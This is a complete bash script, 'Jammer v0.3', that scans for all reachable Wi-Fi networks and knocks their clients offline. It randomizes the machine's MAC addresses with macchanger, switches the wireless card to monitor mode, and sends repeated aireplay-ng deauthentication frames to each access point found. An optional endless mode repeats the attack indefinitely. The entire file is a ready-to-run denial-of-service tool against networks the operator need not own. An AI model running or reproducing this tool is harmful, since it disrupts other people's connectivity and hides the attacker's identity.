#!/bin/bash

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE

# Current Version
VERSION=v0.3

# Default name for wireless interface
W_INT=wlan0

# Default name for ethernet interface
E_INT=eth0

# Base name for scan files
NAME=jam_scan

# Regex for is-number check
re='^[0-9]+$'

# Default DeAuth times for each MAC address
DE_AUTH_NUMBER=10

# Yes to all variable
YES_TO_ALL=0

# If 1 we do not remove the files after the end
KEEP_SCAN_FILES=0

# SCAN TIME
SCAN_TIME=60

# Decide if the program is an endless loop
ENDLESS=0

# An array of files to whitelist
WHITE_LIST=

# Some colors
RED='\e[0;31m'
GREEN='\e[0;32m'
BROWN='\e[0;33m'
BOLD='\e[1m'
NC='\e[0m'

# Prompt
PROMPT="${BOLD}jam!${NC} "

# Check to see if we have the right permissions
function check_perm {
    if (( EUID != 0 )); then
      echo -e "${PROMPT}${RED}Re-run the script, this time with root privileges.${NC}"
      exit 0
    fi
}

# Check if any of the required commands is missing
function check_dep {
    for command in airmon-ng macchanger iwlist awk
    do
      if [[ -z $(which $command) ]]; then
         echo "$command was not found"
         echo "Consider installing it from the repositories of your distro."
         exit 0
      fi
    done
    echo -e "${PROMPT}${GREEN}All dependencies are met, moving on.${NC}"
}

# Check if argument is number
function check_number {
    if [[ ! ($1 =~ $re) ]]; then
        echo -e "${PROMPT}${RED}Wrong argument format. Exiting.${NC}"
        exit 0
    fi
    return 1
}

# Check if array contains element
function array_contains_element { 
    local array="$1[@]"
    local seeking=$2
    local in=1
    for element in "${!array}"; do
        if [[ $element == $seeking ]]; then
            in=0
            break
        fi
    done
    return $in
}

# Change the MACs of the machine
function change_macs {
    # Change mac address for eth0 interfaces
    printf "${PROMPT}Changing MAC for Ethernet Interface\n"
    macchanger -A $E_INT
    # Change mac address and initiate monitor mode
    printf "${PROMPT}Changing MAC for Wireless Interface\n"
    ifconfig $W_INT down
    sleep 1
    macchanger -A $W_INT
    # Set wlan to monitor mode
    sleep 1
    iwconfig $W_INT mode Monitor
    sleep 1
    ifconfig $W_INT up
}

# Reset the MACs and settings and remove files created
function cleanup_and_reset {
    printf "${PROMPT}Reseting the default MAC for Ethernet Interface\n"
    macchanger -p $E_INT
    printf "${PROMPT}Reseting the default MAC for Wireless Interface\n"
    ifconfig $W_INT down
    sleep 1
    macchanger -p $W_INT
    sleep 1
    iwconfig $W_INT mode Managed
    sleep 1
    ifconfig $W_INT up
    if [[ KEEP_SCAN_FILES -eq 0 ]]; then
        printf "${PROMPT}Cleaning up the created files . . .\n"
        rm -f ${NAME}_out.txt
        rm -f $NAME-01.csv
        rm -f $NAME-01.cap
        rm -f $NAME-01.kismet.csv
        rm -f $NAME-01.kismet.netxml
    fi
    printf "${PROMPT}Done. Exiting.\n"
}

# A warning to show before the attack starts
function warn_before {
    printf "${PROMPT}${GREEN}DONE FINDING TARGETS${NC}\n"
    printf "${PROMPT}${RED}THE ATTACK WILL START IN 5 SECONDS${NC}\n"
    printf "${PROMPT}${GREEN}IF YOU WANT TO ABORT DO IT NOW${NC}\n"
    sleep 5
}

function warn_about_interface {
    printf "${PROMPT}${BROWN}The detected interfaces are: \n${NC}"
    ls /sys/class/net/ | awk '{print "     ",$1}'
    printf "${PROMPT}${BROWN}The defaults are${NC} $W_INT${BROWN} and ${NC}$E_INT\n"
    printf "${PROMPT}${BROWN}If they do not match, cancel the scan and use -e and -w to set them\n${NC}"
    if [[ YES_TO_ALL -eq 0 ]]; then
        printf "${PROMPT}${BROWN}Waiting 8 seconds to make up your mind${NC}\n"
        sleep 8
    fi
    printf "${PROMPT}${BROWN}Continuing ...${NC}\n"
}


# Prints the help message
function show_help {
    echo
    echo "Usage: jammer [OPTION] ... "
    echo "Jam Wifi Networks That Your Wireless Card Can Reach."
    echo
    printf "${GREEN} -d, --deauths${NC}"
    printf ": Set the number of deauthentications for each station. Default is 10\n"
    printf "${GREEN} -y, --yes${NC}"
    printf ": Make 'Yes' the answer for everything the script asks\n"
    printf "${GREEN} -s, --endless${NC}"
    printf ": When reaching the end of the list, start again\n"
    printf "${GREEN} -f, --whitelist${NC}"
    printf ": A file with ESSID's to ignore during the attack\n"
    printf "${GREEN} -k, --keep${NC}"
    printf ": Keep the scan files after the script ends\n"
    printf "${GREEN} -n, --name${NC}"
    printf ": Choose the names the scan files are saved as\n"
    printf "${GREEN} -e, --ethernet${NC}"
    printf ": Set the name for the ethernet interface. Default is 'eth0'\n"
    printf "${GREEN} -w, --wireless${NC}"
    printf ": Set the name for the wireless interface. Default is 'wlan0'\n"
    printf "${GREEN} -h, --help${NC}"
    printf ": Show this help message\n"
    echo
    echo
}


function scan_area {
    if iwlist $W_INT scanning |
        while IFS= read -r line; do
            [[ "$line" =~ Address ]] && bssid=${line##*ss: }
            [[ "$line" =~ \(Channel ]] && { channel=${line##*nel }; channel=${channel:0:$((${#channel}-1))}; }
            [[ "$line" =~ ESSID ]] && {
                essid=${line##*ID:}
                #array_contains_element $WHITE_LIST $essid == 0 && echo "${bssid};${channel};${essid}"
                found=0
                for element in "${WHITE_LIST[@]}"; do    
                    element=$( echo "${element}" | sed -e 's/^ *//' -e 's/ *$//' );
                    if [[ $element == $essid ]]; then
                        found=1
                        break
                    fi
                done
                if [[ $found -eq 0 ]]; then
                    echo "${bssid};${channel};${essid}"
                fi
            }     
        done > ${NAME}_out.txt ; 
    then 
        echo "Something went wrong, retrying"
        sleep 5
        scan_area
    fi
}

# $1 -> ESSID
# $2 -> BSSID
# $3 -> CHANNEL
function deauth {
    if [[ "$channel" =~ $re ]]; then
        echo -e ${PROMPT}DeAuth for: ${RED} "$1" ${NC} with BSSID: "$2" @ ${GREEN}Channel "$3" ${NC}
        sleep 3
        iwconfig $W_INT channel "$3"
        aireplay-ng -0 $DE_AUTH_NUMBER -a "$2" $W_INT 
    fi
}

function read_file_and_deauth {  
    warn_before
    # Read the file, line by line and de-auth each MAC 
    while read -r line
    do
        bssid=`echo $line | awk -F";" '{print $1}'`
        channel=`echo $line | awk -F";" '{print $2}'`
        essid=`echo $line | awk -F";" '{print $3}'`
        deauth "$essid" "$bssid" "$channel"
    done < ${NAME}_out.txt
}

# Starts attack, if ENDLESS is 1, goes on forever
function main_attack {
    read_file_and_deauth 
    if [[ ENDLESS -eq 1 ]]; then
        main_attack 
    else exit 0
    fi
}


# A fucntion to print the detected stations from the file
function show_detected_stations {
    printf "${PROMPT}Detected Stations are:\n"
    awk -F";" '{print NR,$3}' ${NAME}_out.txt 
    printf "\n\n"
}


echo
echo "Jammer $VERSION"
echo


# Parse the options if there are any
while [[ $# > 0 ]]
do
key="$1"
case $key in
    -d|--deauths)
        DE_AUTH_NUMBER="$2"
        check_number $DE_AUTH_NUMBER
        echo -e "${PROMPT}${GREEN}Setting deauth number to $DE_AUTH_NUMBER ${NC}"
        shift
    ;;
    -y|--yes)
        YES_TO_ALL=1
        echo -e "${PROMPT}${GREEN}Setting YES as the answer to all${NC}"
    ;;
    -s|--endless)
        ENDLESS=1
        echo -e "${PROMPT}${GREEN}Setting mode to Endless${NC}"
    ;;
    -f|--whitelist)
        readarray WHITE_LIST < "$2"
        echo -e "${PROMPT}${GREEN}Trying to whitelist the ESSID's in the file $2 ${NC}"
        shift
    ;;
    -k|--keep)
        KEEP_SCAN_FILES=1
        echo -e "${PROMPT}${GREEN}Scan files will be kept${NC}"
    ;;
    -n|--name)
        NAME="$2"
        echo -e "${PROMPT}${GREEN}Setting scan file names to $NAME ${NC}"
        shift
    ;;
    -e|--ethernet)
        E_INT="$2"
        echo -e "{PROMPT}${GREEN}Setting ethernet interface name to $E_INT ${NC}"
        shift
    ;;
    -w|--wireless)
        W_INT="$2"
        echo -e "{PROMPT}${GREEN}Setting wireless interface name to $W_INT ${NC}"
        shift
    ;;
    -h|--help)
        show_help
        exit 0
    ;;
    *)
        echo -e "${PROMPT}${RED}Unknown option, exiting.${NC}"
        exit 0
    ;;
esac
# Go to the next argument
shift 
done




# Permissions
check_perm

# Dependencies
check_dep

# Interface
warn_about_interface

# Trap to clean the files and reset at the end
trap cleanup_and_reset EXIT

# Change directory to the place the script is executed from
cd "$(dirname "$0")"



# Show the station names you want to filter out
if [ ${#WHITE_LIST[@]} -ne 0 ]; then
    echo -e "${PROMPT}Whitelisted stations: ${NC}"
    echo "${WHITE_LIST[@]}" | sed -e 's/^ *//' -e 's/ *$//'
fi


# Do the scan and save the found MAC addresses and channels to a file in a known format
printf "${PROMPT}${GREEN}Scaning the area for active stations${NC}\n"
scan_area
change_macs
show_detected_stations

# Check if the user wants no interaction
if [[ YES_TO_ALL -eq 1 ]]; then
    main_attack
    exit 0
fi

# Else ask the user
printf "${PROMPT}Scan is completed. Start jamming? [Y/n] "
read answer_start
case $answer_start in
        [Nn] | [Nn][Oo] ) 
            printf "${PROMPT}${RED}Aborted.\n${NC}"          
            exit 0
        ;;
        *) 
            main_attack
            exit 0
        ;;
esac